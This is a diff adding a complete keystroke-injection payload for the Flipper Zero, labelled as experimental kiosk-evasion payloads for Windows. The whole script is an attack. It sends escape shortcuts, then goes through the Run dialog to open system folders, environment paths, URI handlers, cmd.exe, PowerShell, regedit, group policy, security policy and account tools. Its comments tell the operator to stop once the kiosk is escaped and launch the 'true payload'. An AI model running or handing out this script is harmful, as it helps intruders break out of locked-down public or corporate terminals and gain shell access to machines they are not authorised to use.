@@ -1,0 +1,370 @@
+REM KIOSK EVASION EXPERIMENTAL PAYLOADS
+REM Target: Windows
+REM Stop this script when evasion is succeed
+REM and run your true payload
+REM optimised for Flipper Zero
+REM Auth: @CodesParadox
+
+DELAY 2000
+
+REM Try to exit kiosk application
+ALT F4
+DELAY 700
+ALT SPACE
+DELAY 700
+ALT TAB
+DELAY 700
+
+REM Try to open Task Manager
+CTRL ALT DEL
+DELAY 700
+CTRL ESC
+DELAY 700
+CTRL SHIFT ESC
+DELAY 700
+
+REM Try to access system folders and libraries
+GUI r
+ALTSTRING shell:Administrative Tools
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:DocumentsLibrary
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:Libraries
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:UserProfiles
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:Personal
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:SearchHomeFolder
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:NetworkPlacesFolder
+ENTER
+DELAY 500
+GUI r
+ALTSTRING shell:SendTo
+ENTER
+DELAY 500
+
+REM Try to access system directories
+GUI r
+ALTSTRING file:///C:/Windows
+ENTER
+DELAY 500
+GUI r
+ALTSTRING file:///C:/Windows/System32
+ENTER
+DELAY 500
+GUI r
+ALTSTRING file:///C:/Program Files
+ENTER
+DELAY 500
+GUI r
+ALTSTRING file:///C:/Program Files (x86)
+ENTER
+DELAY 500
+
+REM Try to access system environment variables
+GUI r
+ALTSTRING %WINDIR%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %TMP%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %TEMP%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %SYSTEMDRIVE%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %SYSTEMROOT%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %APPDATA%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %HOMEDRIVE%
+ENTER
+DELAY 500
+GUI r
+ALTSTRING %HOMESHARE%
+ENTER
+DELAY 500
+
+REM Try to access various protocols
+GUI r
+ALTSTRING Callto://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Gopher://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING DHCP://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Telnet://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING TN3270://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Rlogin://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING LDAP://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING News://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Mailto://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING MMS://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING SKYPE://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING SIP://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Play://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Steam://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING Quicktime://
+ENTER
+DELAY 500
+GUI r
+ALTSTRING smb://
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in applications
+GUI r
+ALTSTRING explorer.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING cmd.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING powershell.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING notepad.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING calc.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in utilities
+GUI r
+ALTSTRING diskmgmt.msc
+ENTER
+DELAY 500
+GUI r
+ALTSTRING devmgmt.msc
+ENTER
+DELAY 500
+GUI r
+ALTSTRING eventvwr.msc
+ENTER
+DELAY 500
+GUI r
+ALTSTRING services.msc
+ENTER
+DELAY 500
+GUI r
+ALTSTRING taskmgr.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in configuration tools
+GUI r
+ALTSTRING msconfig.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING regedit.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING gpedit.msc
+ENTER
+DELAY 500
+GUI r
+ALTSTRING secpol.msc
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in system information tools
+GUI r
+ALTSTRING msinfo32.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING dxdiag.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING systeminfo.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING systeminfo.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in troubleshooting tools
+GUI r
+ALTSTRING msdt.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING msdt.exe /id WindowsMediaPlayerDiagnostic
+ENTER
+DELAY 500
+GUI r
+ALTSTRING msdt.exe /id WindowsUpdateDiagnostic
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in accessibility tools
+GUI r
+ALTSTRING narrator.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING magnify.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING osk.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in multimedia tools
+GUI r
+ALTSTRING wmplayer.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING soundrecorder.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING mspaint.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in networking tools
+GUI r
+ALTSTRING ping.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING tracert.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING netsh.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in security tools
+GUI r
+ALTSTRING windowsdefender.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING firewall.cpl
+ENTER
+DELAY 500
+GUI r
+ALTSTRING secpol.msc
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in system maintenance tools
+GUI r
+ALTSTRING cleanmgr.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING diskcleanup.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING chkdsk.exe
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in user account tools
+GUI r
+ALTSTRING control.exe userpasswords
+ENTER
+DELAY 500
+GUI r
+ALTSTRING control.exe useraccounts
+ENTER
+DELAY 500
+GUI r
+ALTSTRING lusrmgr.msc
+ENTER
+DELAY 500
+
+REM Try to access Windows built-in Windows Update tools
+GUI r
+ALTSTRING wuapp.exe
+ENTER
+DELAY 500
+GUI r
+ALTSTRING control.exe update
+ENTER
+DELAY 500
+GUI r
+ALTSTRING windowsupdate.exe
+ENTER
+DELAY 500
+
+REM End of script
